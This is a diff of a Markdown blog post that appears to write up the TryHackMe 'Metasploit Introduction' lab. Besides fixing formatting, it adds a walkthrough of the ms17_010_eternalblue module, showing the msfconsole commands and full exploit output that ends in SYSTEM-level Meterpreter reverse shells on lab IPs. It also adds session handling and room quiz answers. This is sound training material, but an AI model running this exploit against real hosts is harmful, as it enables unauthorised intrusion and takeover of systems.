@@ -1,6 +1,6 @@
 ---
 title:  "THM: Metasploit Introduction"
-date:   2024-02-15 15:00:00 +0000
+date:   2024-02-16 15:00:00 +0000
 categories: [Metasploit]
 tags: [Metasploit]
 ---
@@ -119,7 +119,8 @@ While encoders will ```encode the payload```, they should not be considered a ``
 Terminal
 ```
 /opt/metasploit-framework/embedded/framework/modules# tree -L 2 evasion/
----
+```
+```
 evasion/
 └── windows
     ├── applocker_evasion_install_util.rb
@@ -142,6 +143,8 @@ Exploits, neatly organized by target system.
 
 ```
 /opt/metasploit-framework/embedded/framework/modules# tree -L 1 exploits/
+```
+```
 
 exploits/
 ├── aix
@@ -174,13 +177,14 @@ exploits/
 
 #### NOPs
 
-NOPs ```(No OPeration) do nothing``, literally. They are represented in the Intel x86 CPU family they are represented with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.
+NOPs ```(No OPeration) do nothing```, literally. They are represented in the Intel x86 CPU family they are represented with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.
 
 ```
 /opt/metasploit-framework/embedded/framework/modules# tree -L 1 nops/
-
+```
+```
 nops/
-├── aarch64
+├── aarch64         
 ├── armle
 ├── cmd
 ├── mipsbe
@@ -207,7 +211,8 @@ Metasploit offers the ability to ``send different payloads`` that can open shell
 
 ```
 /opt/metasploit-framework/embedded/framework/modules# tree -L 1 payloads/
-
+```
+```
 payloads/
 ├── adapters
 ├── singles
@@ -219,14 +224,16 @@ payloads/
 4 different directories under payloads: adapters, singles, stagers and stages.
 
 - ```Adapters```: An adapter wraps single payloads to convert them into different formats. For example, a normal single payload can be wrapped inside a Powershell adapter, which will make a single powershell command that will execute the payload.
+
 - ```Singles```: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
-- ```Stagers```: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
-- ```Stages```: Downloaded by the stager. This will allow you to use larger sized payloads.
+
+- ```Stagers```: Responsible for setting up a connection channel between Metasploit and the target system.
+    Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
+
+- ```Stages```: Downloaded by the stager. This will allow you to use ```larger sized payloads```.
 
 Metasploit has a subtle way to help you identify ```single``` (also called ```“inline”```) payloads and ```staged``` payloads.
 
-
-- 
 
 Both are ```reverse``` Windows shells. 
 
@@ -956,8 +963,190 @@ You can use the ```setg``` command to set values that will be used for all modul
 
 The example below uses the following flow;
 
-We use the ms17_010_eternalblue exploitable
-We set the RHOSTS variable using the setg command instead of the set command
-We use the back command to leave the exploit context
-We use an auxiliary (this module is a scanner to discover MS17-010 vulnerabilities)
-The show options command shows the RHOSTS parameter is already populated with the IP address of the target system.
+1. We use the ms17_010_eternalblue exploitable
+2. We set the RHOSTS variable using the setg command instead of the set command
+3. We use the ```back``` command to leave the exploit context
+4. We use an auxiliary (this module is a scanner to discover MS17-010 vulnerabilities)
+5. The ```show options``` command shows the ```RHOSTS``` parameter is already populated with the IP address of the target system.
+
+```
+
+Navigating modules
+msf6 > use exploit/windows/smb/ms17_010_eternalblue 
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > setg rhosts 10.10.165.39
+rhosts => 10.10.165.39
+msf6 exploit(windows/smb/ms17_010_eternalblue) > back
+msf6 > use auxiliary/scanner/smb/smb_ms17_010 
+msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
+
+Module options (auxiliary/scanner/smb/smb_ms17_010):
+
+   Name         Current Setting                                                Required  Description
+   ----         ---------------                                                --------  -----------
+   CHECK_ARCH   true                                                           no        Check for architecture on vulnerable hosts
+   CHECK_DOPU   true                                                           no        Check for DOUBLEPULSAR on vulnerable hosts
+   CHECK_PIPE   false                                                          no        Check for named pipe on vulnerable hosts
+   NAMED_PIPES  /opt/metasploit-framework-5101/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+   RHOSTS       10.10.165.39                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
+   RPORT        445                                                            yes       The SMB service port (TCP)
+   SMBDomain    .                                                              no        The Windows domain to use for authentication
+   SMBPass                                                                     no        The password for the specified username
+   SMBUser                                                                     no        The username to authenticate as
+   THREADS      1                                                              yes       The number of concurrent threads (max one per host)
+
+msf6 auxiliary(scanner/smb/smb_ms17_010) >
+```
+The ```setg``` command sets a global value that will be used until you exit Metasploit or clear it using the ```unsetg``` command.
+
+
+#### Using modules
+
+Once all module parameters are set, you can launch the module using the exploit command. Metasploit also supports the run command, which is an alias created for the exploit command as the word exploit did not make sense when using modules that were not exploits (port scanners, vulnerability scanners, etc.).
+
+
+The exploit command can be used without any parameters or using the “```-z```” parameter.
+
+The ```exploit -z``` command will run the exploit and background the session as soon as it opens.
+
+
+#### The exploit -z command
+```
+msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z
+```
+```
+[*] Started reverse TCP handler on 10.10.44.70:4444 
+[*] 10.10.12.229:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.12.229:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.12.229:445      - Scanned 1 of 1 hosts (100% complete)
+[*] 10.10.12.229:445 - Connecting to target for exploitation.
+[+] 10.10.12.229:445 - Connection established for exploitation.
+[+] 10.10.12.229:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.12.229:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.12.229:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.12.229:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.12.229:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.12.229:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.12.229:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.12.229:445 - Sending all but last fragment of exploit packet
+[*] 10.10.12.229:445 - Starting non-paged pool grooming
+[+] 10.10.12.229:445 - Sending SMBv2 buffers
+[+] 10.10.12.229:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.12.229:445 - Sending final SMBv2 buffers.
+[*] 10.10.12.229:445 - Sending last fragment of exploit packet!
+[*] 10.10.12.229:445 - Receiving response from exploit packet
+[+] 10.10.12.229:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.12.229:445 - Sending egg to corrupted connection.
+[*] 10.10.12.229:445 - Triggering free of corrupted buffer.
+[*] Sending stage (201283 bytes) to 10.10.12.229
+[*] Meterpreter session 2 opened (10.10.44.70:4444 -> 10.10.12.229:49186) at 2021-08-20 02:06:48 +0100
+[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.12.229:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] Session 2 created in the background.
+msf6 exploit(windows/smb/ms17_010_eternalblue) >
+```
+This will return you the context prompt from which you have run the exploit.
+
+Some modules support the check option. This will check if the target system is vulnerable without exploiting it.
+
+#### Sessions
+Once a vulnerability has been successfully exploited, a session will be created. This is the communication channel established between the target system and Metasploit.
+
+
+
+You can use the ```background``` command to background the session prompt and go back to the ```msfconsole``` prompt.
+
+
+
+#### Backgrounding sessions
+```
+meterpreter > background
+```
+```
+[*] Backgrounding session 2...
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+```
+
+Alternatively, ```CTRL+Z ```can be used to ```background sessions.```
+
+The sessions command can be used from the msfconsole prompt or any context to see the existing sessions.
+
+#### Listing active sessions
+```
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions
+```
+```
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
+  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > back
+msf6 > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
+  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)
+
+msf6 >
+```
+
+To interact with any session, you can use the ```sessions -i ``` command followed by the desired session number.
+
+
+#### Interacting with sessions
+```
+msf6 > sessions
+```
+```
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
+  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)
+```
+```
+msf6 > sessions -i 2
+```
+```
+[*] Starting interaction with 2...
+meterpreter >
+```
+
+
+How would you set the LPORT value to 6666?
+```
+set LPORT 6666
+```
+How would you set the global value for RHOSTS  to 10.10.19.23 ?
+```
+setg rhosts 10.10.19.23
+```
+What command would you use to clear a set payload?
+```
+unset payload
+```
+What command do you use to proceed with the exploitation phase?
+```
+exploit
+```
+
+Task 5  Summary
+---
+Metasploit is a powerful tool that facilitates the exploitation process. The exploitation process comprises three main steps; ```finding``` the exploit, ```customizing``` the exploit, and ```exploiting``` the vulnerable service.
+
+Metasploit provides many modules that you can use for each step of the exploitation process. Through this room, we have seen the basic components of Metasploit and their respective use.
+
+It would be best if you also had used the ```ms17_010_eternalblue``` exploit to gain access to the target VM.
+
+In the following rooms, we will cover Metasploit and its components in more detail. Once completed, this module should give you a good understanding of the capabilities of Metasploit.
